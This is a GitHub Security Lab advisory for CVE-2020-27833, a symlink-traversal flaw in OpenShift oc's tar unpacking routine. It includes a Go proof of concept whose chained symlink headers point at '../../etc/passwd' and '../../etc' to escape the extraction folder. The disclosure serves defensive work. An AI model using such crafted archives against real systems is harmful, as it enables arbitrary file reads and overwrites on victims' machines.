<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">January 12, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-261: Unsafe handling of symbolic links in oc unpacking routine - CVE-2020-27833</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/ghsecuritylab">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/61799930?s=35" height="35" width="35">
        <span>GitHub Security Lab</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>11/30/2020: reported to security@hashicorp.com</li>
  <li>12/01/2020: issue is acknowledged</li>
  <li>12/10/2020: <a href="https://access.redhat.com/security/cve/CVE-2020-27833">CVE advisory</a> is published</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The unsafe handling of symbolic links in an unpacking routine may enable attackers to read and/or write to arbitrary locations outside the designated target folder.</p>

<h2 id="product">Product</h2>

<p>oc</p>

<h2 id="tested-version">Tested Version</h2>

<p>Latest commit at the time of reporting (November 27, 2020).</p>

<h2 id="details">Details</h2>

<h3 id="unsafe-handling-of-symbolic-links-in-unpacking-routine">Unsafe handling of symbolic links in unpacking routine</h3>

<p>The routine <a href="https://github.com/openshift/oc/blob/master/pkg/cli/image/archive/archive.go#L96"><code class="language-plaintext highlighter-rouge">unpackLayer</code></a> attempts to guard against creating symbolic links that point outside the directory a tar archive is extracted to. However, a malicious tarball first linking  <code class="language-plaintext highlighter-rouge">subdir/parent</code> to <code class="language-plaintext highlighter-rouge">..</code> (allowed, because <code class="language-plaintext highlighter-rouge">subdir/..</code> falls within the archive root) and then linking <code class="language-plaintext highlighter-rouge">subdir/parent/escapes</code> to <code class="language-plaintext highlighter-rouge">..</code> results in a symbolic link pointing to the tarball’s parent directory, contrary to the routine’s goals.</p>

<p>Proof of concept, using a version of <code class="language-plaintext highlighter-rouge">unpackLayer</code> tweaked to accept an array of tar headers instead of working from an actual tar archive:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
  <span class="s">"archive/tar"</span>
  <span class="s">"fmt"</span>
  <span class="s">"os"</span>
  <span class="s">"path/filepath"</span>
  <span class="s">"strings"</span>

  <span class="s">"github.com/docker/docker/pkg/system"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">var</span> <span class="n">headers</span> <span class="p">[]</span><span class="n">tar</span><span class="o">.</span><span class="n">Header</span> <span class="o">=</span> <span class="nb">make</span><span class="p">([]</span><span class="n">tar</span><span class="o">.</span><span class="n">Header</span><span class="p">,</span> <span class="m">4</span><span class="p">)</span>

  <span class="n">headers</span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeDir</span>

  <span class="n">headers</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/parent"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">=</span> <span class="s">".."</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span>

  <span class="n">headers</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/parent/passwd"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">=</span> <span class="s">"../../etc/passwd"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">2</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span>

  <span class="n">headers</span><span class="p">[</span><span class="m">3</span><span class="p">]</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="s">"subdir/parent/etc"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">3</span><span class="p">]</span><span class="o">.</span><span class="n">Linkname</span> <span class="o">=</span> <span class="s">"../../etc"</span>
  <span class="n">headers</span><span class="p">[</span><span class="m">3</span><span class="p">]</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">=</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span>

  <span class="n">err</span> <span class="o">:=</span> <span class="n">unpackLayer</span><span class="p">(</span><span class="s">"/tmp/extracthere"</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
  <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
    <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">unpackLayer</span><span class="p">(</span><span class="n">dest</span> <span class="kt">string</span><span class="p">,</span> <span class="n">headers</span> <span class="p">[]</span><span class="n">tar</span><span class="o">.</span><span class="n">Header</span><span class="p">)</span> <span class="p">(</span><span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>

  <span class="c">// Iterate through the files in the archive.</span>
  <span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">hdr</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">headers</span> <span class="p">{</span>

    <span class="c">// Normalize name, for safety and for a simple is-root check</span>
    <span class="n">hdr</span><span class="o">.</span><span class="n">Name</span> <span class="o">=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Clean</span><span class="p">(</span><span class="n">hdr</span><span class="o">.</span><span class="n">Name</span><span class="p">)</span>

    <span class="c">// Note as these operations are platform specific, so must the slash be.</span>
    <span class="k">if</span> <span class="o">!</span><span class="n">strings</span><span class="o">.</span><span class="n">HasSuffix</span><span class="p">(</span><span class="n">hdr</span><span class="o">.</span><span class="n">Name</span><span class="p">,</span> <span class="kt">string</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">PathSeparator</span><span class="p">))</span> <span class="p">{</span>
      <span class="c">// Not the root directory, ensure that the parent directory exists.</span>
      <span class="c">// This happened in some tests where an image had a tarfile without any</span>
      <span class="c">// parent directories.</span>
      <span class="n">parent</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Dir</span><span class="p">(</span><span class="n">hdr</span><span class="o">.</span><span class="n">Name</span><span class="p">)</span>
      <span class="n">parentPath</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">parent</span><span class="p">)</span>

      <span class="k">if</span> <span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Lstat</span><span class="p">(</span><span class="n">parentPath</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">os</span><span class="o">.</span><span class="n">IsNotExist</span><span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">err</span> <span class="o">=</span> <span class="n">system</span><span class="o">.</span><span class="n">MkdirAll</span><span class="p">(</span><span class="n">parentPath</span><span class="p">,</span> <span class="m">0755</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
          <span class="k">return</span> <span class="n">err</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">path</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">hdr</span><span class="o">.</span><span class="n">Name</span><span class="p">)</span>
    <span class="n">rel</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Rel</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
      <span class="k">return</span> <span class="n">err</span>
    <span class="p">}</span>

    <span class="c">// Note as these operations are platform specific, so must the slash be.</span>
    <span class="k">if</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">rel</span><span class="p">,</span> <span class="s">".."</span><span class="o">+</span><span class="kt">string</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">PathSeparator</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"%q is outside of %q"</span><span class="p">,</span> <span class="n">hdr</span><span class="o">.</span><span class="n">Name</span><span class="p">,</span> <span class="n">dest</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="n">base</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Base</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="s">"archive.WhiteoutPrefix"</span><span class="p">)</span> <span class="p">{</span>
      <span class="c">// ...</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="c">// If path exits we almost always just want to remove and replace it.</span>
      <span class="c">// The only exception is when it is a directory *and* the file from</span>
      <span class="c">// the layer is also a directory. Then we want to merge them (i.e.</span>
      <span class="c">// just apply the metadata from the layer).</span>
      <span class="k">if</span> <span class="n">fi</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Lstat</span><span class="p">(</span><span class="n">path</span><span class="p">);</span> <span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
        <span class="k">if</span> <span class="o">!</span><span class="p">(</span><span class="n">fi</span><span class="o">.</span><span class="n">IsDir</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="n">hdr</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">==</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeDir</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">RemoveAll</span><span class="p">(</span><span class="n">path</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="n">err</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>

      <span class="n">srcHdr</span> <span class="o">:=</span> <span class="n">hdr</span>

      <span class="c">// Hard links into /.wh..wh.plnk don't work, as we don't extract that directory, so</span>
      <span class="c">// we manually retarget these into the temporary files we extracted them into</span>
      <span class="k">if</span> <span class="n">hdr</span><span class="o">.</span><span class="n">Typeflag</span> <span class="o">==</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeLink</span> <span class="o">&amp;&amp;</span> <span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">filepath</span><span class="o">.</span><span class="n">Clean</span><span class="p">(</span><span class="n">hdr</span><span class="o">.</span><span class="n">Linkname</span><span class="p">),</span> <span class="s">"archive.WhiteoutLinkDir"</span><span class="p">)</span> <span class="p">{</span>
        <span class="c">// ...</span>
      <span class="p">}</span>

      <span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">createTarFile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">srcHdr</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">err</span>
      <span class="p">}</span>

    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="no">nil</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">createTarFile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">extractDir</span> <span class="kt">string</span><span class="p">,</span> <span class="n">hdr</span> <span class="n">tar</span><span class="o">.</span><span class="n">Header</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>

  <span class="c">// ...</span>

  <span class="k">switch</span> <span class="n">hdr</span><span class="o">.</span><span class="n">Typeflag</span> <span class="p">{</span>

  <span class="k">case</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeDir</span><span class="o">:</span>
    <span class="c">// Create directory unless it exists as a directory already.</span>
    <span class="c">// In that case we just want to merge the two</span>
    <span class="k">if</span> <span class="n">fi</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Lstat</span><span class="p">(</span><span class="n">path</span><span class="p">);</span> <span class="o">!</span><span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">fi</span><span class="o">.</span><span class="n">IsDir</span><span class="p">())</span> <span class="p">{</span>
      <span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Mkdir</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="m">0755</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">err</span>
      <span class="p">}</span>
    <span class="p">}</span>

  <span class="k">case</span> <span class="n">tar</span><span class="o">.</span><span class="n">TypeSymlink</span><span class="o">:</span>
    <span class="c">//   path         -&gt; hdr.Linkname = targetPath</span>
    <span class="c">// e.g. /extractDir/path/to/symlink   -&gt; ../2/file  = /extractDir/path/2/file</span>
    <span class="n">targetPath</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">filepath</span><span class="o">.</span><span class="n">Dir</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="n">hdr</span><span class="o">.</span><span class="n">Linkname</span><span class="p">)</span>

    <span class="c">// the reason we don't need to check symlinks in the path (with FollowSymlinkInScope) is because</span>
    <span class="c">// that symlink would first have to be created, which would be caught earlier, at this very check:</span>
    <span class="k">if</span> <span class="o">!</span><span class="n">strings</span><span class="o">.</span><span class="n">HasPrefix</span><span class="p">(</span><span class="n">targetPath</span><span class="p">,</span> <span class="n">extractDir</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"invalid symlink %q -&gt; %q"</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">hdr</span><span class="o">.</span><span class="n">Linkname</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Symlink</span><span class="p">(</span><span class="n">hdr</span><span class="o">.</span><span class="n">Linkname</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
      <span class="k">return</span> <span class="n">err</span>
    <span class="p">}</span>

  <span class="k">default</span><span class="o">:</span>
    <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"unhandled tar header type %d"</span><span class="p">,</span> <span class="n">hdr</span><span class="o">.</span><span class="n">Typeflag</span><span class="p">)</span>
  <span class="p">}</span>

  <span class="c">// ...</span>

  <span class="k">return</span> <span class="no">nil</span>
<span class="p">}</span>

</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to arbitrary file write (with same permissions as the program running the unpack operation) if the attacker can control the archive file. Additionally, if the attacker has read access to the unpacked files, he may be able to read arbitrary system files the parent process has permissions to read.</p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2020-27833</li>
</ul>

<h2 id="resources">Resources</h2>
<ul>
  <li>https://access.redhat.com/security/cve/CVE-2020-27833</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub team member <a href="https://github.com/smowton">@smowton (Chris Smowton)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-261</code> in any communication regarding this issue.</p>

